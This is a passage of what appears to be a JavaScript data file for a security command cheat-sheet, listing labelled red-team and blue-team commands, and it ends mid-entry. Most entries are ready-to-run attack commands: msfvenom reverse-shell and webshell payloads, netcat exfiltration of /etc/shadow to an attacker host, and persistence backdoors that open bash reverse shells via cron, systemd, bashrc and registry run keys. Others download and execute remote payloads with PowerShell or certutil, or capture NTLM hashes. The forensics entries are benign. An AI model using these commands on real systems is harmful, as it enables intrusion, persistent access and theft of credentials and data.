    { id: 'msfvenom-aspx', title: 'Msfvenom ASPX', team: 'red', category: 'payloads',
      description: 'Generate an ASPX webshell for IIS.',
      tags: ['msfvenom', 'aspx', 'webshell'], command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f aspx -o shell.aspx',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'msfvenom-php', title: 'Msfvenom PHP', team: 'red', category: 'payloads',
      description: 'Generate a PHP reverse shell payload.',
      tags: ['msfvenom', 'php', 'webshell'], command: 'msfvenom -p php/meterpreter/reverse_tcp LHOST=LHOST LPORT=LPORT -f raw -o shell.php',
      killchain: 'weaponize', attack: ['resource-development'], pyramid: 'tools', owasp: [] },
    { id: 'listener-nc', title: 'Netcat Listener', team: 'red', category: 'payloads',
      description: 'Start a netcat catch-all listener.',
      tags: ['nc', 'listener'], command: 'nc -lvnp LPORT',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'listener-rlwrap', title: 'Rlwrap Listener', team: 'red', category: 'payloads',
      description: 'Listener with readline support for arrow keys.',
      tags: ['rlwrap', 'nc', 'listener'], command: 'rlwrap nc -lvnp LPORT',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'listener-multi-handler', title: 'Metasploit Handler', team: 'red', category: 'payloads',
      description: 'MSF multi-handler for staged payloads.',
      tags: ['metasploit', 'handler'], command: 'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT LPORT; exploit"',
      killchain: 'c2', attack: ['command-control'], pyramid: 'tools', owasp: [] },

    // ── Receivers, Servers & Catchers ────────────────────
    { id: 'http-upload-server', title: 'HTTP Upload Server', team: 'red', category: 'receivers',
      description: 'Python HTTP server that accepts file uploads (PUT + POST multipart).',
      tags: ['python', 'http-server', 'upload', 'receiver'], command: 'python3 -c "\nimport http.server, os\nclass H(http.server.SimpleHTTPRequestHandler):\n  def do_PUT(self):\n    path = self.translate_path(self.path)\n    length = int(self.headers[\'Content-Length\'])\n    with open(path, \'wb\') as f: f.write(self.rfile.read(length))\n    self.send_response(201); self.end_headers()\n  do_POST = do_PUT\nhttp.server.HTTPServer((\'0.0.0.0\', 8000), H).serve_forever()\n"\n# Upload from target: curl -X PUT https://LHOST:8000/loot.txt -d @/etc_passwd',
      killchain: 'c2', attack: ['command-control', 'exfiltration'], pyramid: 'ips', owasp: [] },
    { id: 'https-server', title: 'HTTPS Server (self-signed)', team: 'red', category: 'receivers',
      description: 'Quick HTTPS server with self-signed cert for encrypted delivery.',
      tags: ['python', 'https', 'ssl', 'receiver'], command: '# Generate cert:\nopenssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 1 -nodes -subj "/CN=LHOST"\n# Serve:\npython3 -c "\nimport http.server, ssl\nctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\nctx.load_cert_chain(\'cert.pem\', \'key.pem\')\nwith http.server.HTTPServer((\'0.0.0.0\', 443), http.server.SimpleHTTPRequestHandler) as srv:\n  srv.socket = ctx.wrap_socket(srv.socket, server_side=True)\n  srv.serve_forever()\n"',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'php-server', title: 'PHP Dev Server', team: 'red', category: 'receivers',
      description: 'Built-in PHP server — great for testing PHP shells and webshells.',
      tags: ['php', 'http-server', 'receiver'], command: 'php -S 0.0.0.0:8080 -t .',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'ruby-http-server', title: 'Ruby HTTP Server', team: 'red', category: 'receivers',
      description: 'One-liner Ruby HTTP file server.',
      tags: ['ruby', 'http-server', 'receiver'], command: 'ruby -run -e httpd -- -p 8000 .',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'updog', title: 'Updog Upload Server', team: 'red', category: 'receivers',
      description: 'HTTP/HTTPS file server with upload support and auth.',
      tags: ['updog', 'http-server', 'upload', 'receiver'], command: 'updog -p 8000\n# With SSL and password:\nupdog -p 443 --ssl --password s3cr3t',
      killchain: 'c2', attack: ['command-control', 'exfiltration'], pyramid: 'tools', owasp: [] },
    { id: 'ftp-server', title: 'FTP Server (pyftpdlib)', team: 'red', category: 'receivers',
      description: 'Quick anonymous FTP server for file transfer.',
      tags: ['python', 'ftp', 'receiver'], command: 'python3 -m pyftpdlib -p 21 -w\n# With auth:\npython3 -m pyftpdlib -p 21 -u admin -P pass -w',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'webdav-server', title: 'WebDAV Server', team: 'red', category: 'receivers',
      description: 'WebDAV server for Windows file transfer (net use \\\\LHOST\\share).',
      tags: ['webdav', 'impacket', 'receiver'], command: '# Impacket WebDAV:\nwsgidav --host 0.0.0.0 --port 80 --root /tmp/share --auth anonymous\n# On Windows target:\nnet use Z: https://LHOST/share\ncopy C:\\secrets.txt Z:\\',
      killchain: 'c2', attack: ['command-control', 'exfiltration'], pyramid: 'tools', owasp: [] },
    { id: 'nc-file-receiver', title: 'Netcat File Receiver', team: 'red', category: 'receivers',
      description: 'Catch a single file sent via netcat.',
      tags: ['nc', 'receiver', 'exfiltration'], command: '# Receiver (attacker):\nnc -lvnp 9001 > received_file\n# Sender (target):\nnc LHOST 9001 < /etc/shadow\n# or with cat:\ncat /etc_passwd | nc LHOST 9001',
      killchain: 'actions', attack: ['exfiltration'], pyramid: 'ips', owasp: [] },
    { id: 'interactsh', title: 'Interactsh OOB Server', team: 'red', category: 'receivers',
      description: 'Out-of-band interaction server — catches DNS, HTTP, SMTP, LDAP callbacks. Perfect for blind SSRF/XXE/RCE.',
      tags: ['interactsh', 'oob', 'receiver', 'callback'], command: 'interactsh-client\n# Generates a unique URL like abc123.oast.fun\n# Use in payloads: curl http://abc123.oast.fun/ssrf-test\n# Monitors DNS, HTTP, SMTP, LDAP callbacks in real-time',
      killchain: 'exploitation', attack: ['initial-access', 'execution'], pyramid: 'tools', owasp: ['A10'] },
    { id: 'callback-logger', title: 'HTTP Callback Logger', team: 'red', category: 'receivers',
      description: 'Log all incoming HTTP requests with headers and body — blind injection validator.',
      tags: ['python', 'callback', 'receiver'], command: 'python3 -c "\nimport http.server, json\nclass H(http.server.BaseHTTPRequestHandler):\n  def do_GET(self): self._log()\n  def do_POST(self): self._log()\n  def _log(self):\n    length = int(self.headers.get(\'Content-Length\', 0))\n    body = self.rfile.read(length).decode() if length else \'\'\n    print(f\'\\n=== {self.command} {self.path} ===\')\n    print(dict(self.headers))\n    if body: print(f\'Body: {body}\')\n    self.send_response(200); self.end_headers(); self.wfile.write(b\'ok\')\nhttp.server.HTTPServer((\'0.0.0.0\', 8888), H).serve_forever()\n"',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ips', owasp: ['A10', 'A03'] },
    { id: 'dns-listener', title: 'DNS Exfil Listener', team: 'red', category: 'receivers',
      description: 'Catch DNS queries for data exfiltration or OOB detection.',
      tags: ['dns', 'exfiltration', 'receiver'], command: '# Using tcpdump:\ntcpdump -i any -n udp port 53 -l | tee dns_exfil.log\n# Using dnscat2 server:\nruby dnscat2.rb --dns "domain=exfil.DOMAIN" --no-cache',
      killchain: 'actions', attack: ['exfiltration', 'command-control'], pyramid: 'domains', owasp: [] },
    { id: 'smtp-receiver', title: 'SMTP Catch-all Server', team: 'red', category: 'receivers',
      description: 'Local SMTP server that logs all received emails (great for password reset capture).',
      tags: ['python', 'smtp', 'receiver', 'email'], command: 'python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25\n# Or with aiosmtpd:\npython3 -c "\nimport asyncio\nfrom aiosmtpd.controller import Controller\nfrom aiosmtpd.handlers import Debugging\nController(Debugging(), hostname=\'0.0.0.0\', port=25).start()\nasyncio.get_event_loop().run_forever()\n"',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'artifacts', owasp: ['A07'] },
    { id: 'ngrok-tunnel', title: 'Ngrok Tunnel', team: 'red', category: 'receivers',
      description: 'Expose local listener through NAT via ngrok.',
      tags: ['ngrok', 'tunnel', 'receiver'], command: '# HTTP:\nngrok http 8000\n# TCP (for reverse shells):\nngrok tcp LPORT\n# Then use the ngrok URL/port as LHOST in payloads',
      killchain: 'c2', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'responder-http', title: 'Responder HTTP/SMB Capture', team: 'red', category: 'receivers',
      description: 'Capture NTLM hashes via spoofed HTTP/SMB/WPAD authentication.',
      tags: ['responder', 'ntlm', 'receiver', 'capture'], command: 'responder -I eth0 -wPv\n# Force auth from Windows target:\n# dir \\\\LHOST\\share\n# or: curl https://LHOST/any',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'scp-receive', title: 'SCP File Receive', team: 'red', category: 'receivers',
      description: 'Pull files from target via SCP/SSH.',
      tags: ['ssh', 'scp', 'receiver'], command: '# Pull from target:\nscp USER@TARGET:/etc/shadow ./loot/\n# Pull directory:\nscp -r USER@TARGET:/var/log/ ./loot/logs/\n# Push to target:\nscp payload.sh USER@TARGET:/tmp/',
      killchain: 'actions', attack: ['exfiltration', 'command-control'], pyramid: 'artifacts', owasp: [] },

    // ── Privilege Escalation ─────────────────────────────
    { id: 'linpeas', title: 'LinPEAS', team: 'red', category: 'privesc',
      description: 'Local Linux privilege escalation checks.',
      tags: ['linux', 'privesc', 'linpeas'], command: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh',
      killchain: 'actions', attack: ['privilege-escalation', 'discovery'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'winpeas', title: 'WinPEAS', team: 'red', category: 'privesc',
      description: 'Local Windows privilege escalation checks.',
      tags: ['windows', 'privesc', 'winpeas'], command: 'powershell -c "iwr -UseBasicParsing https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile $env:TEMP\\winpeas.exe; Start-Process $env:TEMP\\winpeas.exe"',
      killchain: 'actions', attack: ['privilege-escalation', 'discovery'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'sudo-l', title: 'Sudo Rights Check', team: 'red', category: 'privesc',
      description: 'Identify sudo-based escalation paths.',
      tags: ['linux', 'sudo'], command: 'sudo -l',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'find-suid', title: 'Find SUID Binaries', team: 'red', category: 'privesc',
      description: 'Look for risky SUID binaries.',
      tags: ['linux', 'suid'], command: 'find / -perm -4000 -type f 2>/dev/null',
      killchain: 'actions', attack: ['privilege-escalation', 'discovery'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'linux-capabilities', title: 'Linux Capabilities Check', team: 'red', category: 'privesc',
      description: 'Find binaries with elevated Linux capabilities.',
      tags: ['linux', 'capabilities'], command: 'getcap -r / 2>/dev/null',
      killchain: 'actions', attack: ['privilege-escalation', 'discovery'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'writable-path', title: 'Writable PATH Dirs', team: 'red', category: 'privesc',
      description: 'Find writable directories in PATH for hijacking.',
      tags: ['linux', 'path-hijack'], command: 'echo $PATH | tr ":" "\\n" | xargs -I{} sh -c \'test -w "{}" && echo "WRITABLE: {}"\'',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'pspy', title: 'pspy Process Snoop', team: 'red', category: 'privesc',
      description: 'Monitor processes without root using pspy.',
      tags: ['linux', 'pspy', 'processes'], command: './pspy64 -pf -i 1000',
      killchain: 'actions', attack: ['privilege-escalation', 'discovery'], pyramid: 'tools', owasp: [] },
    { id: 'gtfobins-check', title: 'GTFOBins Check', team: 'red', category: 'privesc',
      description: 'Check SUID binaries against GTFOBins for privesc.',
      tags: ['linux', 'gtfobins', 'suid'], command: 'find / -perm -4000 -type f 2>/dev/null | while read f; do echo "=== $f ==="; strings "$f" | head -5; done',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'win-token-priv', title: 'Windows Token Privileges', team: 'red', category: 'privesc',
      description: 'Check current token privileges for privesc vectors.',
      tags: ['windows', 'token', 'privileges'], command: 'whoami /priv',
      killchain: 'actions', attack: ['privilege-escalation', 'discovery'], pyramid: 'ttps', owasp: ['A01'], os: 'windows' },
    { id: 'unquoted-svc', title: 'Unquoted Service Paths', team: 'red', category: 'privesc',
      description: 'Find unquoted Windows service paths for hijacking.',
      tags: ['windows', 'services'], command: 'wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows" | findstr /i /v """',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'], os: 'windows' },
    { id: 'always-install-elevated', title: 'AlwaysInstallElevated', team: 'red', category: 'privesc',
      description: 'Check if MSI always installs elevated (privesc via msiexec).',
      tags: ['windows', 'registry', 'msi'], command: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'], os: 'windows' },
    { id: 'dll-hijack-search', title: 'DLL Hijack Search Order', team: 'red', category: 'privesc',
      description: 'Find missing DLLs for DLL hijacking via Process Monitor.',
      tags: ['windows', 'dll', 'hijack'], command: '# Use Procmon: Filter → Path contains ".dll" AND Result is "NAME NOT FOUND"\n# Then craft payload DLL with msfvenom:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f dll -o hijacked.dll',
      killchain: 'actions', attack: ['privilege-escalation', 'persistence'], pyramid: 'ttps', owasp: ['A01'], os: 'windows' },

    // ── Tunneling & Pivoting ─────────────────────────────
    { id: 'chisel-server', title: 'Chisel Server', team: 'red', category: 'tunnel',
      description: 'Start chisel server for pivoting.',
      tags: ['chisel', 'pivot'], command: 'chisel server --reverse -p 8001',
      killchain: 'c2', attack: ['command-control'], pyramid: 'tools', owasp: [] },
    { id: 'chisel-client', title: 'Chisel Reverse SOCKS', team: 'red', category: 'tunnel',
      description: 'Create reverse SOCKS proxy from target.',
      tags: ['chisel', 'socks', 'pivot'], command: 'chisel client LHOST:8001 R:socks',
      killchain: 'c2', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'ssh-dynamic', title: 'SSH Dynamic SOCKS', team: 'red', category: 'tunnel',
      description: 'SOCKS proxy via SSH.',
      tags: ['ssh', 'socks', 'pivot'], command: 'ssh -D 9050 USER@TARGET',
      killchain: 'c2', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'ssh-local', title: 'SSH Local Port Forward', team: 'red', category: 'tunnel',
      description: 'Forward remote port to local machine.',
      tags: ['ssh', 'pivot'], command: 'ssh -L 8080:127.0.0.1:80 USER@TARGET',
      killchain: 'c2', attack: ['command-control', 'lateral-movement'], pyramid: 'artifacts', owasp: [] },
    { id: 'ssh-remote', title: 'SSH Remote Port Forward', team: 'red', category: 'tunnel',
      description: 'Expose local port on remote host.',
      tags: ['ssh', 'pivot'], command: 'ssh -R 9090:127.0.0.1:8080 USER@TARGET',
      killchain: 'c2', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'socat-redirect', title: 'Socat Redirect', team: 'red', category: 'tunnel',
      description: 'Relay traffic between hosts/ports.',
      tags: ['socat', 'pivot'], command: 'socat TCP-LISTEN:8080,fork TCP:TARGET:80',
      killchain: 'c2', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'ligolo', title: 'Ligolo-ng Agent', team: 'red', category: 'tunnel',
      description: 'Lightweight tunneling — agent to proxy.',
      tags: ['ligolo', 'pivot'], command: '# On attacker: ligolo-proxy -selfcert\n# On target:\n./agent -connect LHOST:11601 -ignore-cert',
      killchain: 'c2', attack: ['command-control'], pyramid: 'tools', owasp: [] },

    // ── Persistence ──────────────────────────────────────
    { id: 'persist-cron', title: 'Cron Persistence', team: 'red', category: 'persist',
      description: 'Add reverse shell cron job.',
      tags: ['cron', 'persistence', 'linux'], command: '(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'") | crontab -',
      killchain: 'installation', attack: ['persistence'], pyramid: 'ttps', owasp: [] },
    { id: 'persist-schtask', title: 'Scheduled Task', team: 'red', category: 'persist',
      description: 'Windows scheduled task for persistence.',
      tags: ['schtasks', 'persistence', 'windows'], command: 'schtasks /create /sc MINUTE /mo 5 /tn "WindowsUpdate" /tr "powershell -ep bypass -w hidden -c IEX(IWR https://LHOST/shell.ps1)" /ru SYSTEM',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'persist-service', title: 'Systemd Service', team: 'red', category: 'persist',
      description: 'Create systemd service for persistent access.',
      tags: ['systemd', 'persistence', 'linux'], command: 'cat <<EOF > /etc/systemd/system/update.service\n[Unit]\nDescription=System Update\n[Service]\nExecStart=/bin/bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"\nRestart=always\nRestartSec=60\n[Install]\nWantedBy=multi-user.target\nEOF\nsystemctl enable --now update.service',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'persist-ssh-key', title: 'SSH Authorized Key', team: 'red', category: 'persist',
      description: 'Add attacker SSH public key for persistent access.',
      tags: ['ssh', 'persistence', 'linux'], command: 'echo "ssh-rsa AAAA...attacker-key..." >> ~/.ssh/authorized_keys\nchmod 600 ~/.ssh/authorized_keys',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: ['A01'] },
    { id: 'persist-bashrc', title: 'Bashrc Backdoor', team: 'red', category: 'persist',
      description: 'Add reverse shell to bashrc for login persistence.',
      tags: ['bashrc', 'persistence', 'linux'], command: 'echo "bash -i >& /dev/tcp/LHOST/LPORT 0>&1 &" >> ~/.bashrc',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [] },
    { id: 'persist-run-key', title: 'Registry Run Key', team: 'red', category: 'persist',
      description: 'Add Windows registry run key for startup persistence.',
      tags: ['registry', 'persistence', 'windows'], command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "powershell -ep bypass -w hidden -f C:\\Users\\Public\\update.ps1" /f',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [], os: 'windows' },
    { id: 'persist-winlogon', title: 'Winlogon Helper DLL', team: 'red', category: 'persist',
      description: 'Modify Winlogon to load custom DLL on login.',
      tags: ['winlogon', 'persistence', 'windows'], command: 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d "C:\\Windows\\system32\\userinit.exe,C:\\Users\\Public\\payload.exe" /f',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [], os: 'windows' },
    { id: 'persist-startup-folder', title: 'Startup Folder', team: 'red', category: 'persist',
      description: 'Drop payload in Windows Startup folder.',
      tags: ['startup', 'persistence', 'windows'], command: 'copy payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"',
      killchain: 'installation', attack: ['persistence'], pyramid: 'artifacts', owasp: [], os: 'windows' },

    // ── File Transfer ────────────────────────────────────
    { id: 'download-http', title: 'File Download (Linux)', team: 'red', category: 'transfer',
      description: 'Download a file from attacker host.',
      tags: ['wget', 'curl'], command: 'wget https://LHOST:8000/payload -O /tmp/payload\n# or\ncurl -o /tmp/payload https://LHOST:8000/payload',
      killchain: 'delivery', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'upload-python-http', title: 'Python HTTP Server', team: 'red', category: 'transfer',
      description: 'Host current directory over HTTP.',
      tags: ['python', 'http-server'], command: 'python3 -m http.server 8000',
      killchain: 'delivery', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'smb-share', title: 'SMB Share (Impacket)', team: 'red', category: 'transfer',
      description: 'Temporary SMB share for Windows file transfer.',
      tags: ['smb', 'impacket'], command: 'impacket-smbserver share . -smb2support',
      killchain: 'delivery', attack: ['command-control', 'lateral-movement'], pyramid: 'tools', owasp: [] },
    { id: 'upload-certutil', title: 'Certutil Download', team: 'red', category: 'transfer',
      description: 'Download file on Windows using certutil.',
      tags: ['certutil', 'windows'], command: 'certutil -urlcache -split -f https://LHOST:8000/payload.exe C:\\Windows\\Temp\\payload.exe',
      killchain: 'delivery', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'upload-powershell', title: 'PowerShell Download', team: 'red', category: 'transfer',
      description: 'Download file on Windows using PowerShell.',
      tags: ['powershell', 'windows'], command: 'powershell -c "IWR -Uri https://LHOST:8000/payload.exe -OutFile C:\\Windows\\Temp\\payload.exe"',
      killchain: 'delivery', attack: ['command-control'], pyramid: 'artifacts', owasp: [] },
    { id: 'exfil-nc', title: 'Exfil via Netcat', team: 'red', category: 'transfer',
      description: 'Transfer file from target to attacker via nc.',
      tags: ['nc', 'exfiltration'], command: '# Attacker: nc -lvnp 9001 > loot.tar.gz\n# Target:\ntar czf - /path/to/loot | nc LHOST 9001',
      killchain: 'actions', attack: ['exfiltration'], pyramid: 'ips', owasp: [] },
    { id: 'exfil-base64', title: 'Base64 File Encode', team: 'red', category: 'transfer',
      description: 'Encode binary for copy-paste exfil.',
      tags: ['base64', 'exfiltration'], command: 'base64 -w0 /path/to/file\n# Decode on attacker:\necho "BASE64STRING" | base64 -d > file',
      killchain: 'actions', attack: ['exfiltration'], pyramid: 'ttps', owasp: [] },

    // ── Enumeration ──────────────────────────────────────
    { id: 'netstat-linux', title: 'Open Ports (Linux)', team: 'red', category: 'enum',
      description: 'Check listening ports/processes on Linux.',
      tags: ['linux', 'ports'], command: 'ss -tulpen',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'netstat-windows', title: 'Open Ports (Windows)', team: 'red', category: 'enum',
      description: 'Check listening ports/processes on Windows.',
      tags: ['windows', 'ports'], command: 'netstat -ano',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'find-creds', title: 'Find Credentials', team: 'red', category: 'enum',
      description: 'Search for credential strings in configs.',
      tags: ['credentials', 'grep'], command: 'grep -RInE "password|passwd|pwd|secret|token|apikey" /etc /opt /var/www 2>/dev/null',
      killchain: 'actions', attack: ['credential-access', 'collection'], pyramid: 'ttps', owasp: ['A02'] },
    { id: 'world-writable', title: 'World-Writable Files', team: 'red', category: 'enum',
      description: 'Find world-writable files and directories.',
      tags: ['linux', 'permissions'], command: 'find / -writable -type f 2>/dev/null | grep -v proc',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: ['A01'] },
    { id: 'recent-files', title: 'Recently Modified Files', team: 'red', category: 'enum',
      description: 'Find files modified in the last 24 hours.',
      tags: ['linux', 'files'], command: 'find / -mtime -1 -type f 2>/dev/null | grep -v proc | head -50',
      killchain: 'recon', attack: ['discovery', 'collection'], pyramid: 'artifacts', owasp: [] },
    { id: 'docker-enum', title: 'Docker Enumeration', team: 'red', category: 'enum',
      description: 'Enumerate Docker containers and images.',
      tags: ['docker', 'containers'], command: 'docker ps -a\ndocker images\ndocker network ls\nls -la /var/run/docker.sock',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'smb-enum', title: 'SMB Share Enumeration', team: 'red', category: 'enum',
      description: 'Enumerate SMB shares with smbclient.',
      tags: ['smb', 'shares', 'windows'], command: 'smbclient -L //TARGET -N\n# or with creds:\nsmbclient -L //TARGET -U "user%password"',
      killchain: 'recon', attack: ['discovery'], pyramid: 'ips', owasp: [] },
    { id: 'snmp-walk', title: 'SNMP Walk', team: 'red', category: 'enum',
      description: 'Enumerate SNMP information from target.',
      tags: ['snmp', 'network'], command: 'snmpwalk -v2c -c public TARGET\n# Extended info:\nsnmpwalk -v2c -c public TARGET 1.3.6.1.2.1.25.4.2.1.2',
      killchain: 'recon', attack: ['discovery'], pyramid: 'ips', owasp: [] },
    { id: 'nfs-enum', title: 'NFS Share Enumeration', team: 'red', category: 'enum',
      description: 'List NFS shares and mount them.',
      tags: ['nfs', 'shares', 'linux'], command: 'showmount -e TARGET\n# Mount:\nmkdir /mnt/nfs && mount -t nfs TARGET:/share /mnt/nfs',
      killchain: 'recon', attack: ['discovery'], pyramid: 'ips', owasp: [] },

    // ── Forensics & Incident Response (NEW) ──────────────
    { id: 'volatility-imageinfo', title: 'Volatility Image Info', team: 'blue', category: 'forensics',
      description: 'Identify OS profile for a memory dump.',
      tags: ['volatility', 'memory', 'forensics'], command: 'vol.py -f memory.dmp windows.info',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'volatility-pslist', title: 'Volatility Process List', team: 'blue', category: 'forensics',
      description: 'List running processes from memory dump.',
      tags: ['volatility', 'memory', 'processes'], command: 'vol.py -f memory.dmp windows.pslist',
      killchain: 'actions', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'volatility-netscan', title: 'Volatility Network Scan', team: 'blue', category: 'forensics',
      description: 'Extract network connections from memory.',
      tags: ['volatility', 'memory', 'network'], command: 'vol.py -f memory.dmp windows.netscan',
      killchain: 'c2', attack: ['command-control', 'discovery'], pyramid: 'tools', owasp: [] },
    { id: 'autopsy-timeline', title: 'Autopsy Timeline', team: 'blue', category: 'forensics',
      description: 'Create a filesystem timeline from disk image.',
      tags: ['autopsy', 'timeline', 'disk'], command: 'fls -r -m "/" disk.img > body.txt && mactime -b body.txt -d > timeline.csv',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'strings-malware', title: 'Strings Analysis', team: 'blue', category: 'forensics',
      description: 'Extract readable strings from a suspicious binary.',
      tags: ['strings', 'malware', 'static'], command: 'strings -n 8 suspicious.exe | grep -iE "http|https|ftp|cmd|powershell|base64" | sort -u',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'pe-analysis', title: 'PE File Analysis', team: 'blue', category: 'forensics',
      description: 'Analyze PE headers and imports of a Windows binary.',
      tags: ['pe', 'malware', 'static'], command: 'python3 -c "import pefile; pe=pefile.PE(\'suspect.exe\'); print(pe.dump_info())"',
      killchain: 'delivery', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'disk-image-mount', title: 'Disk Image Mount', team: 'blue', category: 'forensics',
      description: 'Mount forensic disk image read-only for analysis.',
      tags: ['forensics', 'disk', 'mount'], command: 'mkdir /mnt/evidence\nmount -o ro,loop,noexec evidence.dd /mnt/evidence',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'log2timeline', title: 'Plaso / log2timeline', team: 'blue', category: 'forensics',
      description: 'Generate a super timeline from a disk image.',
      tags: ['plaso', 'timeline', 'forensics'], command: 'log2timeline.py /tmp/evidence.plaso evidence.dd\npsort.py -o l2tcsv /tmp/evidence.plaso "date > \'2024-01-01\'" > timeline.csv',
      killchain: 'actions', attack: ['collection'], pyramid: 'tools', owasp: [] },
    { id: 'volatility-malfind', title: 'Volatility Malfind', team: 'blue', category: 'forensics',
      description: 'Detect injected code in process memory.',
      tags: ['volatility', 'memory', 'injection'], command: 'vol.py -f memory.dmp windows.malfind',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'tools', owasp: [] },
    { id: 'chainsaw-evtx', title: 'Chainsaw EVTX Analysis', team: 'blue', category: 'forensics',
      description: 'Hunt through Windows event logs with Sigma rules.',
      tags: ['chainsaw', 'evtx', 'sigma', 'windows'], command: 'chainsaw hunt C:\\Windows\\System32\\winevt\\Logs -s sigma/ --mapping mappings/sigma-event-logs-all.yml -o results.csv --csv',
      killchain: 'actions', attack: ['defense-evasion', 'collection'], pyramid: 'tools', owasp: [] },
    { id: 'prefetch-parser', title: 'Windows Prefetch Parser', team: 'blue', category: 'forensics',
      description: 'Parse Windows Prefetch files to see executed programs.',
      tags: ['prefetch', 'windows', 'execution'], command: 'python3 PECmd.py -d C:\\Windows\\Prefetch --csv /tmp/prefetch_output',
      killchain: 'actions', attack: ['execution'], pyramid: 'artifacts', owasp: [], os: 'windows' },

    // ── OSINT (NEW) ──────────────────────────────────────
    { id: 'recon-ng', title: 'Recon-ng Framework', team: 'red', category: 'osint',
      description: 'Full-featured OSINT web reconnaissance framework.',
      tags: ['recon-ng', 'osint', 'enum'], command: 'recon-ng -w workspace\nmarketplace install all\nmodules load recon/domains-hosts/hackertarget\noptions set SOURCE DOMAIN\nrun',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'spiderfoot', title: 'SpiderFoot OSINT', team: 'red', category: 'osint',
      description: 'Automated OSINT collection across 200+ data sources.',
      tags: ['spiderfoot', 'osint'], command: 'spiderfoot -s DOMAIN -t all -o csv',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'maltego-transform', title: 'Maltego CE', team: 'red', category: 'osint',
      description: 'Visual link analysis and OSINT transforms.',
      tags: ['maltego', 'osint', 'graph'], command: '# Maltego CE: Create new graph > Add entity (Domain: DOMAIN) > Run All Transforms',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'domains', owasp: [] },
    { id: 'whois-lookup', title: 'WHOIS Lookup', team: 'red', category: 'osint',
      description: 'Query domain registration info.',
